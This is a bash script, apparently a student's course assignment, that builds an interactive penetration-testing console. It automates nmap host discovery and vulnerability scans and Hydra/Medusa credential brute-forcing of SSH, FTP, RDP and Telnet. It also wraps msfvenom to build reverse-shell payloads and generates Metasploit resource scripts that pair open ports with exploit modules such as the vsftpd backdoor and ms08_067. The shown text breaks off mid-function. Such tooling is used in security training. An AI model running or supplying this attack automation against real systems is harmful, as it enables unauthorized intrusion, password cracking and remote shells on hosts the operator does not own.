#!/bin/bash
# student name: alex pashin 
# lecturer name : eliran berkovich the goat <3
# class code : HMagen773629
# student code : s2
# i've have been using chat Gpt to complete the task 


# Load colors
NC='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'


# Check if user have root 
if [[ "$EUID" -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root.${NC}"
    echo -e "${YELLOW}    Try again using: ${GREEN}sudo ./bluescan.sh${NC}"
    exit 1
  fi

# Banner 
show_banner() {
  clear
  echo -e "${BLUE}"
  cat << "EOF"
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿
⣿⣿⡏⠁⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣶⣶⣶⣶⣦⣤⡄⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿
⣿⣿⣷⣄⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡧⠇⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣾⣮⣭⣿⡻⣽⣒⠀⣤⣜⣭⠐⢐⣒⠢⢰⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿⣿⣿⣿⣿⡟⣾⣿⠂⢈⢿⣷⣞⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣷⣶⣾⡿⠿⣿⠗⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠋⠉⠑⠀⠀⢘⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠟⢹⣿⣿⡇⢀⣶⣶⠴⠶⠀⠀⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠀⠀⢸⣿⣿⠀⠀⠣⠀⠀⠀⠀⠀⡟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠹⣿⣧⣀⠀⠀⠀⠀⡀⣴⠁⢘⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿
⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⠗⠂⠄⠀⣴⡟⠀⠀⡃⠀⠉⠉⠟⡿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠾⠛⠂⢹⠀⠀⠀⢡⠀⠀⠀⠀⠀⠙⠛⠿⢿
EOF
  echo -e "${NC}"
  echo -e "${MAGENTA}BlueScan Console - Developed by Heinsenberg${NC}"
  echo -e "${CYAN}Type 'help' to see available commands.${NC}"
  echo
}

# ───────────────────────────────────────────────────────────────
# Signal Trap: Gracefully handle Ctrl+C (SIGINT)
# This prevents the script from exiting mid-run without cleanup
# and gives a friendly message instead of a raw terminal dump.
# ───────────────────────────────────────────────────────────────

# Trap SIGINT (Ctrl+C) and route it to our custom function
trap ctrl_c INT

# This function runs when Ctrl+C is pressed
ctrl_c() {
  echo -e "\n${RED}[!] Ctrl+C detected. Exiting BlueScan safely...${NC}"
  echo -e "${YELLOW}[info] Session aborted by the operator.${NC}"
  exit 1
}

# ─────────────────────────────────────────────────────────────────────
# Audit Logger: Records timestamped events per session
# ─────────────────────────────────────────────────────────────────────
log_event() {
  local message="$1"
  local log_file="audit.log"  # You're already inside the session folder!
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$log_file"
}


# ─────────────────────────────────────────────────────────────────────
# setup_session: Initializes a new BlueScan session environment
# - Prompts user to name the session (no spaces allowed)
# - Prevents overwriting by checking for existing folders
# - Creates a dedicated folder under sessions/ for all results
# - Sets the CURRENT_SESSION variable and logs the creation
# - Navigates into the session directory for localized operations
# ─────────────────────────────────────────────────────────────────────

setup_session() {
  while true; do
    echo -ne "${CYAN}Enter a name for this BlueScan session (no spaces): ${NC}"
    read -r session_dir

    # Check if name is empty or contains spaces
    if [[ -z "$session_dir" || "$session_dir" =~ \  ]]; then
      echo -e "${RED}Invalid session name. Please avoid spaces and empty input.${NC}"
      continue
    fi

    # Check if session directory already exists
    if [[ -d "sessions/$session_dir" ]]; then
      echo -e "${RED}Session '$session_dir' already exists. Try a different name.${NC}"
    else
      break  # Valid session name, exit loop
    fi
  done

  # Create session directory and move into it
  mkdir -p "sessions/$session_dir"
  cd "sessions/$session_dir" || {
    echo -e "${RED}Failed to enter session directory. Exiting.${NC}"
    exit 1
  }

  CURRENT_SESSION="$session_dir"
  echo -e "${GREEN}Session directory created: sessions/$CURRENT_SESSION${NC}"
  echo
  log_event "[SESSION] Created session: $CURRENT_SESSION"
}

# ─────────────────────────────────────────────────────────────────────
# Reset Function: Clear session data and start fresh without exiting
# ─────────────────────────────────────────────────────────────────────
reset_bluescan() {
  echo -e "${YELLOW}[reset] This will reset the current session and let you start fresh.${NC}"
  echo -ne "${CYAN}Are you sure you want to reset? (y/n): ${NC}"
  read -r confirm

  if [[ "$confirm" =~ ^[Yy]$ ]]; then
    echo -e "${MAGENTA}[reset] Cleaning current session and returning to main menu...${NC}"
    
    # Go back to root dir
    cd ../../ 2>/dev/null

    # Clear session var
    unset CURRENT_SESSION

    # Re-run banner and session setup
    show_banner
    setup_session
  else
    echo -e "${GREEN}[reset] Cancelled. Staying in current session.${NC}"
  fi
}

# Help screen
show_help() {
  echo -e "${YELLOW}Available Commands:${NC}"
  echo -e "${GREEN}  recon${NC}          Run a quick recon module"
  echo -e "${GREEN}  scan --basic${NC}   Run basic scan"
  echo -e "${GREEN}  scan --full${NC}    Run full scan"
  echo -e "${GREEN}  scan --berserk${NC} Unleash full TCP+UDP scan with vuln scripts (slow, deep, savage)"
  echo -e "${GREEN}  creds${NC}          Run weak credential check (Hydra or Medusa)"
  echo -e "${GREEN}  show creds${NC}     View all saved brute-force credential results"
  echo -e "${GREEN}  metasploit${NC}     Open Metasploit module menu"
  echo -e "${GREEN}  search${NC}         Search scan or creds results for a keyword"
  echo -e "${GREEN}  zip results${NC}    Package all results, payloads, logs and scripts into one .zip file"
  echo -e "${GREEN}  clear${NC}          Clear the terminal"
  echo -e "${GREEN}  update${NC}         Check/install required tools"
  echo -e "${GREEN}  reset${NC}          Reset current session and start over"
  echo -e "${GREEN}  exit${NC}           Exit BlueScan console"
}
run_recon() {
  # ─────────────────────────────────────────────────────────────────────
  # run_recon: Performs host discovery via ICMP (ping sweep)
  # - Prompts the user to scan either a single IP or a full network (CIDR)
  # - Uses Nmap's host discovery (-sn) to identify live systems
  # - Automatically excludes the attacker's own IP from results
  # - Saves discovered hosts to live_hosts.txt
  # - Logs each scan event with relevant details
  # ─────────────────────────────────────────────────────────────────────

  # Prompt user to select scan type
  echo -e "${YELLOW}[Recon] Do you want to scan a single IP or a network range?${NC}"
  echo -e "${GREEN}1) Single IP"
  echo -e "2) Network/Subnet (CIDR format, e.g. 192.168.1.0/24)${NC}"
  echo -ne "${CYAN}Choose [1/2]: ${NC}"
  read -r mode

  # Automatically detect the local (attacker) IP address to exclude from scan
  local_ip=$(ip route get 1 | awk '{print $7; exit}')
  echo -e "${YELLOW}[Recon] Excluding your host IP: $local_ip${NC}"

  case "$mode" in
    1)
      # Scan a single IP
      echo -ne "${YELLOW}Enter the target IP: ${NC}"
      read -r target_ip
      echo -e "${BLUE}[Recon] Scanning $target_ip for availability...${NC}"
      sleep 1

      nmap -sn "$target_ip" -oG live_hosts.gnmap > /dev/null
      grep "Up" live_hosts.gnmap | awk '{print $2}' | grep -v "$local_ip" > live_hosts.txt

      if [[ -s live_hosts.txt ]]; then
        echo -e "${GREEN}[Recon] Host is up. Saved to live_hosts.txt${NC}"
        echo -e "${GREEN}[Recon] Hosts found:${NC}"
        while IFS= read -r host; do
          echo -e "${CYAN}→ $host${NC}"
        done < live_hosts.txt
        log_event "[RECON] Scanned $target_ip, excluded local IP: $local_ip"
      else
        echo -e "${RED}[Recon] Host appears to be down.${NC}"
        log_event "[RECON] $target_ip appears down (excluded $local_ip)"
      fi
      ;;

    2)
      # Scan a full subnet (CIDR range)
      echo -ne "${YELLOW}Enter the network range (CIDR, e.g. 192.168.1.0/24): ${NC}"
      read -r network

      if [[ ! "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\/[0-9]+$ ]]; then
        echo -e "${RED}[Recon] Invalid CIDR format. Please enter something like 192.168.1.0/24${NC}"
        return
      fi

      echo -e "${BLUE}[Recon] Scanning $network for live hosts...${NC}"
      sleep 1

      nmap -sn "$network" -oG live_hosts.gnmap > /dev/null
      grep "Up" live_hosts.gnmap | awk '{print $2}' | grep -v "$local_ip" > live_hosts.txt

      echo -e "${GREEN}[Recon] Live hosts saved to live_hosts.txt${NC}"
      echo -e "${GREEN}[Recon] Hosts found:${NC}"
      while IFS= read -r host; do
        echo -e "${CYAN}→ $host${NC}"
      done < live_hosts.txt
      log_event "[RECON] Scanned $network, excluded local IP: $local_ip"
      ;;

    *)
      echo -e "${RED}[Recon] Invalid choice. Please enter 1 or 2.${NC}"
      ;;
  esac
}
# ─────────────────────────────────────────────────────────────────────
# basic_scan: Performs a basic scan on all live hosts
# - Supports TCP-only or TCP+UDP scan with service version detection
# - Prompts the user whether to include UDP scanning
# - Uses Nmap with -sS (TCP SYN) and optionally -sU (UDP)
# - Saves results to scans/basic/<ip>.txt
# - Warns if Nmap skips ports due to retransmission cap
# - Logs all scan activity to audit.log
# ─────────────────────────────────────────────────────────────────────
basic_scan() {
  # Check if live hosts file exists
  if [[ ! -f live_hosts.txt ]]; then
    echo -e "${RED}[Scan] live_hosts.txt not found. Run 'recon' first.${NC}"
    return
  fi

  # Create output directory for basic scan results
  mkdir -p scans/basic

  echo -e "${BLUE}[Scan] Starting BASIC scans (TCP only or TCP+UDP)...${NC}"
  sleep 1

  # Ask the user if they want to include UDP in the basic scan
  echo -ne "${CYAN}Include full UDP scan? (Y/n): ${NC}"
  read -r udp_choice

  while IFS= read -r ip; do
    echo -e "${YELLOW}[Scan] Scanning $ip...${NC}"

if [[ "$udp_choice" =~ ^[Yy]$ || -z "$udp_choice" ]]; then
      # Perform full TCP and UDP scan with service version detection
      echo -e "${CYAN}[Scan] Running full TCP + UDP scan on $ip (this may take a while)...${NC}"
     scan_output="scans/basic/${ip}.txt"
      nmap -sS -sU -p- -sV --max-retries 5 --min-rate 150 "$ip" -oN "$scan_output"

# Check for retransmission cap hit
if grep -q "retransmission cap hit" "$scan_output"; then
  echo -e "${YELLOW}[!] Warning: Some ports may have been skipped during scanning.${NC}"
  echo -e "${YELLOW}[!] Reason: Nmap reached the retransmission cap (--max-retries) for certain ports.${NC}"
  echo -e "${YELLOW}[!] Suggestion: Increase --max-retries or reduce --min-rate for higher accuracy.${NC}"
  log_event "[SCAN WARNING] $ip: Nmap hit retransmission cap — results may be incomplete."
fi

    else
      # Perform TCP-only scan
      echo -e "${CYAN}[Scan] Running TCP-only scan on $ip...${NC}"
      nmap -sS -p- -sV --open "$ip" -oN "scans/basic/${ip}.txt"
fi

    echo -e "${GREEN}[Scan] Scan complete for $ip. Output saved to scans/basic/${ip}.txt${NC}"
    log_event "[BASIC SCAN] Scanned $ip (UDP Included: $( [[ "$udp_choice" =~ ^[Yy]$ || -z "$udp_choice" ]] && echo 'Yes' || echo 'No'))"
    echo
  done < live_hosts.txt

  echo -e "${MAGENTA}[Scan] Basic scan completed for all live hosts.${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# full_scan: Performs a deep scan and vulnerability mapping
# - Runs a full TCP port scan (-p-) with version detection (-sV)
# - Uses Nmap's 'vuln' NSE scripts to identify known vulnerabilities
# - Parses service versions from the Nmap output
# - Feeds service strings to Searchsploit for CVE and exploit matching
# - Saves output to scans/full/ and vulns/ directories
# - Warns on skipped ports if retransmission cap is hit
# - Logs full scan and vuln-mapping activity
# ─────────────────────────────────────────────────────────────────────

full_scan() {
  # Make sure live_hosts.txt exists
  if [[ ! -f live_hosts.txt ]]; then
    echo -e "${RED}[Scan] live_hosts.txt not found. Run 'recon' first.${NC}"
    return
  fi

  # Create output directories
  mkdir -p scans/full
  mkdir -p vulns

  echo -e "${BLUE}[Scan] Starting full vulnerability scans...${NC}"
  sleep 1

  while IFS= read -r ip; do
    echo -e "${YELLOW}[Scan] Scanning $ip with NSE vulnerability scripts...${NC}"

    # Step 1: Run Nmap with all ports, version detection, NSE vuln scripts
    scan_output="scans/full/$ip.txt"
nmap -sV --script=vuln -p- --min-rate 1000 --max-retries 2 --host-timeout 10m --script-timeout 30s "$ip" -oN "$scan_output"

# Check for retransmission cap hit
if grep -q "retransmission cap hit" "$scan_output"; then
  echo -e "${YELLOW}[!] Warning: Some ports may have been skipped during scanning.${NC}"
  echo -e "${YELLOW}[!] Reason: Nmap reached the retransmission cap (--max-retries) for certain ports.${NC}"
  echo -e "${YELLOW}[!] Suggestion: Increase --max-retries or reduce --min-rate for higher accuracy.${NC}"
  log_event "[SCAN WARNING] $ip: Nmap hit retransmission cap — results may be incomplete."
fi

  echo -e "${GREEN}[Scan] Nmap results saved to $scan_output${NC}"
  log_event "[FULL SCAN] Ran full-port NSE vuln scan on $ip"
# Step 2: Extract services from scan results for Searchsploit
echo -e "${MAGENTA}[VulnMap] Extracting service versions for $ip...${NC}"
grep -Eo "[A-Za-z0-9_\.\-\/]+ [0-9]+\.[0-9]+(\.[0-9]+)?" "scans/full/$ip.txt" | sort -u > temp_services.txt

    # Step 3: Run searchsploit on each service/version
echo "Searchsploit Results for $ip" > "vulns/${ip}_searchsploit.txt"
echo "====================================" >> "vulns/${ip}_searchsploit.txt"

    while IFS= read -r service_version; do
      echo -e "${CYAN}[Searchsploit] Searching: $service_version${NC}"
      echo -e "\n[ $service_version ]" >> "vulns/${ip}_searchsploit.txt"
      searchsploit "$service_version" >> "vulns/${ip}_searchsploit.txt"
    done < temp_services.txt

    rm -f temp_services.txt

    echo -e "${GREEN}[VulnMap] Searchsploit results saved to vulns/${ip}_searchsploit.txt${NC}"
    log_event "[VULNMAP] Searchsploit completed for $ip"
    echo

  done < live_hosts.txt

  echo -e "${MAGENTA}[Scan] Full vulnerability scan completed for all live hosts.${NC}"
}
# ─────────────────────────────────────────────────────────────────────
# BERSERK SCAN: Full TCP + UDP scan with version detection + vuln scan
# Description:
#   - Runs a deep scan on all ports (TCP + UDP) for all live hosts
#   - Uses Nmap's version detection and 'vuln' NSE script category
#   - Outputs in all formats (.nmap, .xml, .gnmap)
#   - Extracts service versions and cross-references with Searchsploit
#   - Designed for slow, thorough scanning – no timeouts or speed hacks
#   - Use only when you want maximum discovery, regardless of time
#     Output:
#   - Nmap results saved under scans/berserk/
#   - Vulnerability mapping saved under vulns/
#   - Audit logs appended to audit.log
# ─────────────────────────────────────────────────────────────────────

berserk_scan() {
  if [[ ! -f live_hosts.txt ]]; then
    echo -e "${RED}[Berserk] live_hosts.txt not found. Run 'recon' first.${NC}"
    return
  fi

  echo -e "${RED}[!] WARNING: This will run a full TCP+UDP scan with service detection and vuln scripts on ALL PORTS."
  echo -e "${RED}[!] This may take HOURS or even DAYS depending on target speed, firewall behavior, and network size.${NC}"
  echo -ne "${YELLOW}Proceed anyway? (y/n): ${NC}"
  read -r confirm
  echo -e "${RED}"
cat << "EOF"
╔══════════════════════════════════════╗
║     🔥 ENTERING BERSERK MODE 🔥     ║
║  Full TCP+UDP Scan + Version + Vuln ║
║        No mercy. No shortcuts.      ║
╚══════════════════════════════════════╝
EOF
echo -e "${NC}"

  [[ "$confirm" != "y" && "$confirm" != "Y" ]] && echo -e "${CYAN}[Berserk] Scan aborted.${NC}" && return

  mkdir -p scans/berserk
  mkdir -p vulns

  while IFS= read -r ip; do
    echo -e "${MAGENTA}[Berserk] Unleashing chaos scan on $ip...${NC}"

    # Full scan with all output formats
    nmap -sS -sU -sV -p- --script=vuln --script-timeout 140 "$ip" -oA "scans/berserk/$ip"

    echo -e "${GREEN}[Berserk] Scan complete for $ip. Output saved to scans/berserk/$ip.{nmap,gnmap,xml}${NC}"
    log_event "[BERSERK SCAN] Full TCP+UDP vuln scan finished for $ip"

    # Optional: check for retransmission cap (just in case)
    if grep -q "retransmission cap hit" "scans/berserk/$ip.nmap"; then
      echo -e "${YELLOW}[!] Warning: Nmap retransmission cap hit for $ip. Results may be incomplete.${NC}"
      log_event "[BERSERK WARNING] $ip: Nmap retransmission cap hit — possible missed ports."
    fi

    # Extract service versions and search with Searchsploit
    echo -e "${MAGENTA}[Berserk] Extracting service versions for $ip...${NC}"
    grep -Eo "[A-Za-z0-9_\.\-\/]+ [0-9]+\.[0-9]+(\.[0-9]+)?" "scans/berserk/$ip.nmap" | sort -u > temp_services.txt

    echo "Searchsploit Results for $ip" > "vulns/${ip}_searchsploit.txt"
    echo "====================================" >> "vulns/${ip}_searchsploit.txt"

    while IFS= read -r service_version; do
      echo -e "${CYAN}[Searchsploit] $service_version${NC}"
      echo -e "\n[ $service_version ]" >> "vulns/${ip}_searchsploit.txt"
      searchsploit "$service_version" >> "vulns/${ip}_searchsploit.txt"
    done < temp_services.txt

    rm -f temp_services.txt

    echo -e "${GREEN}[Berserk] Searchsploit results saved to vulns/${ip}_searchsploit.txt${NC}"
    log_event "[BERSERK VULNMAP] Searchsploit completed for $ip"
    echo

  done < live_hosts.txt

  echo -e "${RED}[BERSERK] 🔥 Full scan complete. Nothing left behind.${NC}"
}

# ─────────────────────────────────────────────────────────────────────
# Unified Brute-force Menu: Choose Hydra or Medusa for service cracking
# ─────────────────────────────────────────────────────────────────────
bruteforce_menu() {
  # Ensure live_hosts.txt exists
  if [[ ! -f live_hosts.txt ]]; then
    echo -e "${RED}[creds] No live_hosts.txt found. Run 'recon' and 'scan --basic' first.${NC}"
    return
  fi

  mkdir -p creds

  # Prompt for brute-force tool
  echo -e "${YELLOW}Select a brute-force tool:${NC}"
  echo -e "${GREEN}1) Hydra"
  echo -e "2) Medusa${NC}"
  echo -ne "${CYAN}Choice [1-2]: ${NC}"
  read -r tool_choice

  case "$tool_choice" in
    1) TOOL="hydra" ;;
    2) TOOL="medusa" ;;
    *) echo -e "${RED}[creds] Invalid choice.${NC}"; return ;;
  esac

  # Prompt for userlist and passlist
  echo -ne "${CYAN}Enter path to username wordlist: ${NC}"
  read -e USERLIST

  echo -ne "${CYAN}Enter path to password wordlist (blank for rockyou): ${NC}"
  read -e PASSLIST
  [[ -z "$PASSLIST" ]] && PASSLIST="/usr/share/wordlists/rockyou.txt"

  # Check rockyou.txt if needed
  if [[ ! -f "$PASSLIST" && -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
    echo -e "${YELLOW}[creds] rockyou.txt is compressed. Run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz${NC}"
    return
  fi

  if [[ ! -f "$USERLIST" || ! -f "$PASSLIST" ]]; then
    echo -e "${RED}[creds] Invalid wordlist paths.${NC}"
    return
  fi

  # Multi-select service input
  echo -e "${YELLOW}Choose services to brute-force (comma-separated):${NC}"
  echo -e "${GREEN}1) SSH\n2) FTP\n3) RDP\n4) Telnet${NC}"
  echo -ne "${CYAN}Enter service numbers (e.g., 1,2 or 3): ${NC}"
  read -r svc_input
  IFS=',' read -ra svc_array <<< "$svc_input"

  SERVICES=()
  for choice in "${svc_array[@]}"; do
    case "$choice" in
      1) SERVICES+=("ssh") ;;
      2) SERVICES+=("ftp") ;;
      3) SERVICES+=("rdp") ;;
      4) SERVICES+=("telnet") ;;
      *) echo -e "${RED}[creds] Invalid choice: $choice${NC}" ;;
    esac
  done

  if [[ ${#SERVICES[@]} -eq 0 ]]; then
    echo -e "${RED}[creds] No valid services selected.${NC}"
    return
  fi

  # Run brute force per IP/service
  while IFS= read -r ip; do
    for svc in "${SERVICES[@]}"; do
      # Check basic first, then fallback to full
      if [[ -f "scans/basic/$ip.txt" ]]; then
        SCAN_FILE="scans/basic/$ip.txt"
      elif [[ -f "scans/full/$ip.txt" ]]; then
        SCAN_FILE="scans/full/$ip.txt"
      else
        echo -e "${RED}[creds] No scan file found for $ip. Run scan --basic or scan --full first.${NC}"
        continue
      fi

      if grep -qi "$svc" "$SCAN_FILE"; then
        echo -e "${BLUE}[creds] Attacking $svc on $ip using $TOOL...${NC}"

        if [[ "$TOOL" == "hydra" ]]; then
          hydra -L "$USERLIST" -P "$PASSLIST" "$ip" "$svc" -o "creds/${ip}_${svc}_hydra.txt"
        else
          medusa -h "$ip" -U "$USERLIST" -P "$PASSLIST" -M "$svc" -O "creds/${ip}_${svc}_medusa.txt"
        fi

        echo -e "${GREEN}[creds] Results saved to creds/${ip}_${svc}_${TOOL}.txt${NC}"
        log_event "[CREDS] $TOOL used on $ip:$svc using $USERLIST and $PASSLIST"
      else
        echo -e "${YELLOW}[creds] Skipping $ip — $svc not found in scan.${NC}"
      fi
    done
  done < live_hosts.txt

  echo -e "${MAGENTA}[creds] Brute-force session complete.${NC}"
}


# ─────────────────────────────────────────────────────────────────────
# Payload Generator: Wraps msfvenom to create custom reverse payloads
# ─────────────────────────────────────────────────────────────────────
metasploit_payload_generator() {
  # ─────────────────────────────────────────────────────────────────────
  # Reset all input variables to ensure clean prompt on each use
  # ─────────────────────────────────────────────────────────────────────
  unset payload_type lhost lport format output_name

  echo -e "${YELLOW}Payload Generator - msfvenom Wrapper${NC}"
  echo -e "${CYAN}Example Payloads:${NC}"
  echo
  echo -e "  windows/meterpreter/reverse_tcp"
  echo -e "  linux/x86/meterpreter/reverse_tcp"
  echo -e "  cmd/unix/reverse_bash"
  echo 

  # Prompt and validate each input field one by one
  while [[ -z "$payload_type" ]]; do
    echo -ne "${CYAN}Enter payload type: ${NC}"
    read payload_type
  done

  while [[ -z "$lhost" ]]; do
    echo -ne "${CYAN}Enter LHOST: ${NC}"
    read lhost
  done

  while [[ -z "$lport" ]]; do
    echo -ne "${CYAN}Enter LPORT: ${NC}"
    read lport
  done

  while [[ -z "$format" ]]; do
    echo -ne "${CYAN}Enter output format (e.g., exe, elf, raw): ${NC}"
    read format
  done

  while [[ -z "$output_name" ]]; do
    echo -ne "${CYAN}Enter output file name (without extension): ${NC}"
    read output_name
  done

  # Warn if incompatible format is selected for certain payloads
  if [[ "$payload_type" == "cmd/unix/reverse_bash" && "$format" != "raw" ]]; then
    echo -e "${YELLOW}[warn] Payload ${payload_type} is best used with format 'raw'.${NC}"
    echo -e "${YELLOW}[warn] You selected format '$format'. Generation may fail.${NC}"
  fi

  final_file="${output_name}.${format}"

  echo -e "${MAGENTA}[meta] Generating payload with msfvenom...${NC}"
  msfvenom -p "$payload_type" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$final_file"

  if [[ $? -eq 0 ]]; then
    echo -e "${GREEN}[meta] Payload successfully created: ${final_file}${NC}"
    log_event "[MSFVENOM] Generated payload $final_file (type: $payload_type)"
  else
    echo -e "${RED}[meta] Payload generation failed. Double-check your input.${NC}"
  fi
}


# ─────────────────────────────────────────────────────────────────────
# Auto RC Launcher: Builds and executes an .rc script from scan results
# ─────────────────────────────────────────────────────────────────────
metasploit_auto_rc_launcher() {
  echo -e "${YELLOW}[auto_rc] Auto-generating Metasploit resource script from scans...${NC}"

  echo -ne "${CYAN}Enter target IP (must exist in scans): ${NC}"
  read -r target_ip

  scan_file=""
  [[ -f "scans/basic/${target_ip}.txt" ]] && scan_file="scans/basic/${target_ip}.txt"
  [[ -f "scans/full/${target_ip}.txt" ]] && scan_file="scans/full/${target_ip}.txt"

  if [[ -z "$scan_file" ]]; then
    echo -e "${RED}[auto_rc] No scan file found for ${target_ip}.${NC}"
    return
  fi

  echo -e "${MAGENTA}[auto_rc] Detected open ports on $target_ip:${NC}"

  # Parse open ports
  live_ports=$(grep -E "^[0-9]+/tcp" "$scan_file" | grep open | awk '{print $1}' | cut -d'/' -f1)

  # Get OS info (if available)
  os_line=$(grep -i "OS:" "$scan_file")

  for port in $live_ports; do
    case "$port" in
      21) mod="exploit/unix/ftp/vsftpd_234_backdoor" ;;
      22) mod="auxiliary/scanner/ssh/ssh_login" ;;
      23) mod="auxiliary/scanner/telnet/telnet_login" ;;
      25) mod="auxiliary/scanner/smtp/smtp_enum" ;;
      53) mod="auxiliary/gather/dns_enum" ;;
      80) mod="exploit/unix/webapp/php_cgi_arg_injection" ;;
      111) mod="auxiliary/scanner/nfs/nfsmount" ;;
      139|445)
        if echo "$os_line" | grep -iq "windows"; then
          mod="exploit/windows/smb/ms08_067_netapi"
        else
          mod="auxiliary/scanner/smb/smb_enumshares"
        fi
        ;;
      512|513|514) mod="auxiliary/scanner/rservices/rlogin_login" ;;
      1099) mod="exploit/multi/misc/java_rmi_server" ;;
      1524) mod="exploit/unix/shell_reverse_tcp" ;; # This will redirect to multi/handler
      2121) mod="exploit/unix/ftp/proftpd_modcopy_exec" ;;
      3306) mod="auxiliary/scanner/mysql/mysql_login" ;;
      5432) mod="auxiliary/scanner/postgres/postgres_login" ;;
      5900) mod="auxiliary/scanner/vnc/vnc_none_auth" ;;
      6000) mod="auxiliary/server/capture/x11" ;;
      6667|6697) mod="exploit/unix/irc/unreal_ircd_3281_backdoor" ;;
      8009) mod="exploit/multi/http/tomcat_ajp_upload_bypass" ;;
      8180) mod="exploit/multi/http/tomcat_mgr_upload" ;;
      8787) mod="exploit/multi/http/rstudio_rce" ;;
      3632) mod="exploit/unix/misc/distcc_exec" ;;
      *) mod="No suggestion" ;;
    esac
    printf "  Port: %-5s → %s\n" "$port" "$mod"
  done

  echo
  echo -ne "${CYAN}Select a port to build an attack around: ${NC}"
  read -r rport

  # Re-fetch suggestion
  case "$rport" in
    21) suggested_module="exploit/unix/ftp/vsftpd_234_backdoor" ;;
    22) suggested_module="auxiliary/scanner/ssh/ssh_login" ;;
    23) suggested_module="auxiliary/scanner/telnet/telnet_login" ;;
    25) suggested_module="auxiliary/scanner/smtp/smtp_enum" ;;
    53) suggested_module="auxiliary/gather/dns_enum" ;;
    80) suggested_module="exploit/unix/webapp/php_cgi_arg_injection" ;;
    111) suggested_module="auxiliary/scanner/nfs/nfsmount" ;;
    139|445)
      if echo "$os_line" | grep -iq "windows"; then
        suggested_module="exploit/windows/smb/ms08_067_netapi"
      else
        suggested_module="auxiliary/scanner/smb/smb_enumshares"
      fi
      ;;
    512|513|514) suggested_module="auxiliary/scanner/rservices/rlogin_login" ;;
    1099) suggested_module="exploit/multi/misc/java_rmi_server" ;;
    1524) suggested_module="exploit/multi/handler" ;; # replaced
    2121) suggested_module="exploit/unix/ftp/proftpd_modcopy_exec" ;;
    3306) suggested_module="auxiliary/scanner/mysql/mysql_login" ;;
    5432) suggested_module="auxiliary/scanner/postgres/postgres_login" ;;
    5900) suggested_module="auxiliary/scanner/vnc/vnc_none_auth" ;;
    6000) suggested_module="auxiliary/server/capture/x11" ;;
    6667|6697) suggested_module="exploit/unix/irc/unreal_ircd_3281_backdoor" ;;
    8009) suggested_module="exploit/multi/http/tomcat_ajp_upload_bypass" ;;
    8180) suggested_module="exploit/multi/http/tomcat_mgr_upload" ;;
    8787) suggested_module="exploit/multi/http/rstudio_rce" ;;
    3632) suggested_module="exploit/unix/misc/distcc_exec" ;;
    *) suggested_module="" ;;
  esac

  echo -e "${YELLOW}Suggested module: $suggested_module${NC}"
  echo -ne "${CYAN}Use this module? (Y/n): ${NC}"
  read -r use_suggestion

  if [[ "$use_suggestion" =~ ^[Nn]$ ]]; then
    echo -ne "${CYAN}Enter custom Metasploit module: ${NC}"
    read -r exploit_module
  else
    exploit_module="$suggested_module"
  fi

  # Create .rc file
  echo -ne "${CYAN}Enter output .rc filename (without extension): ${NC}"
  read -r rc_name
  rc_file="${rc_name}.rc"
# Set default payload for IRC exploit
if [[ "$exploit_module" == "exploit/unix/irc/unreal_ircd_3281_backdoor" ]]; then
  default_payload="cmd/unix/reverse"
fi

  {
    echo "use $exploit_module"
    echo "set RHOST $target_ip"
    echo "set RPORT $rport"
  } > "$rc_file"

  # Show module options and intelligently set fields
  msfconsole -q -x "use $exploit_module; show options; exit" > temp_opts.txt

  grep -q "LHOST" temp_opts.txt && {
    echo -ne "${CYAN}Enter LHOST: ${NC}"
    read -r lhost
    echo "set LHOST $lhost" >> "$rc_file"
  }

  grep -q "LPORT" temp_opts.txt && {
    echo -ne "${CYAN}Enter LPORT: ${NC}"
    read -r lport
    echo "set LPORT $lport" >> "$rc_file"
  }

 grep -q "PAYLOAD" temp_opts.txt && {
  # Set default if not defined earlier
  [[ -z "$default_payload" ]] && default_payload="cmd/unix/reverse"

